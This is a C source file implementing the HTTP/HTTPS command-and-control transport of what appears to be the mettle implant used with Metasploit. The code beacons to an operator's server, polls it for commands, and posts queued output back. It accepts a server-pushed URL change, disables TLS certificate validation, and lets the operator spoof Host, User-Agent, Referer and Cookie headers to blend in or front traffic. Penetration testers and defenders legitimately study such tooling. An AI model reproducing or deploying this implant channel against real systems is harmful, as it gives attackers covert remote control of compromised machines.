
/**
 * @brief c2_http.c HTTP transport
 * @file c2_http.c
 */

#include <stdbool.h>
#include <stdlib.h>

#include "argv_split.h"
#include "c2.h"
#include "http_client.h"
#include "log.h"
#include "tlv.h"
#include "command_ids.h"

struct http_ctx {
	struct c2_transport *t;
	char *uri;
	struct ev_timer poll_timer;
	char ** headers;
	struct http_request_data data;
	struct http_request_opts opts;
	struct buffer_queue *egress;
	int first_packet;
	int running;
	bool online;
};

static void patch_uri(struct http_ctx *ctx, struct buffer_queue *q)
{
	struct tlv_packet *request = tlv_packet_read_buffer_queue(NULL, q);
	if (request) {
		uint32_t command_id;
		tlv_packet_get_u32(request, TLV_TYPE_COMMAND_ID, &command_id);

		const char *new_uri = tlv_packet_get_str(request, TLV_TYPE_TRANS_URL);

		if (command_id == COMMAND_ID_CORE_PATCH_URL && new_uri) {
			char *old_uri = ctx->uri;
			char *split = ctx->uri;
			char *host = strstr(old_uri, "://");
			if (host) {
				split = strchr(host + 3, '/');
			} else {
				split = strrchr(old_uri, '/');
			}
			if (split) {
				*split = '\0';
			}
			if (asprintf(&ctx->uri, "%s%s", ctx->uri, new_uri) > 0) {
				free(old_uri);
			}
		}
	}
	else {
		/**
		 * put packet in ingress? also consider making `core_patch_url` actually core
		 * and expect the transport or get changed on patch request
		**/
	}
}

static void http_poll_cb(struct http_conn *conn, void *arg)
{
	struct http_ctx *ctx = arg;

	int code = http_conn_response_code(conn);

	if (code > 0) {
		// When the c2 come back online we set the first_packet=true 
		// to setup the session properly.
		if(!ctx->online) {
			ctx->first_packet = 1;
			ctx->poll_timer.repeat = 0.1;
			ctx->online = true;
		}
		c2_transport_reachable(ctx->t);
	} else {
		c2_transport_unreachable(ctx->t);
		ctx->online = false;
	}

	bool got_command = false;
	if (code == 200) {
		struct buffer_queue *q = http_conn_response_queue(conn);
		if (ctx->first_packet) {
			patch_uri(ctx, q);
			ctx->first_packet = 0;
			got_command = true;
		} else {
			size_t len;
			if (buffer_queue_len(ctx->egress) > 0) {
				got_command = true;
			}
			if (buffer_queue_len(q) > 0) {
				got_command = true;
				c2_transport_ingress_queue(ctx->t, q);
			}
		}
	}
	if(ctx->online) {
		if (got_command) {
			ctx->poll_timer.repeat = 0.1;
		} else {
			if (ctx->poll_timer.repeat < 10.0) {
				ctx->poll_timer.repeat += 0.01;
			}
		}
	}else {
		ctx->poll_timer.repeat = 10;
	}
	if (ctx->running) {
		/*
		 * Calling ev_timer_again and setting poll_timer.repeat = 0
		 * Will result in having mettle http polling working sync instead of async.
		 * This is used to avoid pushing data on the queue when the c2 is offline.
		 */
		ev_timer_again(c2_transport_loop(ctx->t), &ctx->poll_timer);
		if(!ctx->online) {
			ctx->poll_timer.repeat = 0;
		}
	}
}

static void http_poll_timer_cb(struct ev_loop *loop, struct ev_timer *w, int revents)
{
	struct http_ctx *ctx = w->data;
	bool sent = false;

	while (buffer_queue_len(ctx->egress) > 0) {
		/*
		 * Metasploit's HTTP handler cannot handle multiple queued messages, send these individually for now
		 * ctx->data.content_len = buffer_queue_remove_all(ctx->egress,
		 *		&ctx->data.content);
		 */
		ctx->data.content = buffer_queue_remove_msg(ctx->egress, &ctx->data.content_len);
		http_request(ctx->uri, http_request_post, http_poll_cb, ctx,
				&ctx->data, &ctx->opts);
		ctx->data.content_len = 0;
		ctx->data.content = NULL;
		sent = true;
	}

	if (!sent) {
		http_request(ctx->uri, http_request_get, http_poll_cb, ctx,
				&ctx->data, &ctx->opts);
	}
}

void http_ctx_free(struct http_ctx *ctx)
{
	if (ctx) {
		if (ctx->egress) {
			buffer_queue_free(ctx->egress);
		}
		free(ctx->uri);
		for (int i = 0; i < ctx->data.num_headers; i++) {
			free(ctx->headers[i]);
		}
		free(ctx->headers);
		free(ctx->data.ua);
		free(ctx->data.referer);
		free(ctx->data.cookie_list);
		free(ctx);
	}
}

static int add_header(struct http_ctx *ctx, const char *header)
{
	ctx->headers = reallocarray(ctx->headers, ctx->data.num_headers + 1,
			sizeof(char *));
	if (ctx->headers) {
		if ((ctx->headers[ctx->data.num_headers] = strdup(header))) {
			ctx->data.num_headers++;
			return 0;
		}
	}
	return -1;
}

int http_transport_init(struct c2_transport *t)
{
	struct http_ctx *ctx = calloc(1, sizeof *ctx);
	if (ctx == NULL) {
		return -1;
	}

	ctx->t = t;
	ctx->uri = strdup(c2_transport_uri(t));
	if (ctx->uri == NULL) {
		goto err;
	}

	ctx->data.content_type = "application/octet-stream";
	ctx->opts.flags = HTTP_OPTS_SKIP_TLS_VALIDATION;

	add_header(ctx, "Connection: close");

	char *args = strchr(ctx->uri, '|');
	if (args) {
		*args = '\0';
		if (strlen(++args)) {
			size_t argc = 0;
			char **argv = argv_split(args, NULL, &argc);
			for (size_t i = 0; i + 1 < argc && argv[i + 1]; i += 2) {
				if (strcmp(argv[i], "--host") == 0) {
					char *host_header = NULL;
					if (asprintf(&host_header, "Host: %s", argv[i + 1]) != -1) {
						add_header(ctx, host_header);
						free(host_header);
					}
				}
				if (strcmp(argv[i], "--ua") == 0) {
					ctx->data.ua = strdup(argv[i + 1]);
					log_info("ua: %s", ctx->data.ua);
				}
				if (strcmp(argv[i], "--referer") == 0) {
					ctx->data.referer = strdup(argv[i + 1]);
					log_info("referer: %s", ctx->data.referer);
				}
				if (strcmp(argv[i], "--cookie") == 0) {
					ctx->data.cookie_list = strdup(argv[i + 1]);
					log_info("cookie: %s", ctx->data.cookie_list);
				}
				if (strcmp(argv[i], "--header") == 0) {
					add_header(ctx, argv[i + 1]);
					log_info("header: %s", argv[i + 1]);
				}
			}
		}
	}

	ctx->data.headers = ctx->headers;
	ctx->first_packet = 1;
	ctx->online = false;
	ev_init(&ctx->poll_timer, http_poll_timer_cb);
	ctx->poll_timer.data = ctx;

	ctx->egress = buffer_queue_new();
	if (ctx->egress == NULL) {
		goto err;
	}

	c2_transport_set_ctx(t, ctx);
	return 0;

err:
	http_ctx_free(ctx);
	return -1;
}

void http_transport_start(struct c2_transport *t)
{
	struct http_ctx *ctx = c2_transport_get_ctx(t);
	ctx->running = 1;
	ctx->poll_timer.repeat = 0.1;
	ev_timer_again(c2_transport_loop(t), &ctx->poll_timer);
	ctx->poll_timer.repeat = 0;
}

void http_transport_egress(struct c2_transport *t, struct buffer_queue *egress)
{
	struct http_ctx *ctx = c2_transport_get_ctx(t);
	buffer_queue_move_all(ctx->egress, egress);
}

void http_transport_stop(struct c2_transport *t)
{
	struct http_ctx *ctx = c2_transport_get_ctx(t);
	if (ctx->running) {
		ctx->running = 0;
	}
}

void http_transport_free(struct c2_transport *t)
{
	struct http_ctx *ctx = c2_transport_get_ctx(t);
	buffer_queue_free(ctx->egress);
}

void c2_register_http_transports(struct c2 *c2)
{
	struct c2_transport_cbs http_cbs = {
		.init = http_transport_init,
		.start = http_transport_start,
		.egress = http_transport_egress,
		.stop = http_transport_stop,
		.free = http_transport_free
	};

	c2_register_transport_type(c2, "http", &http_cbs);
	c2_register_transport_type(c2, "https", &http_cbs);
}
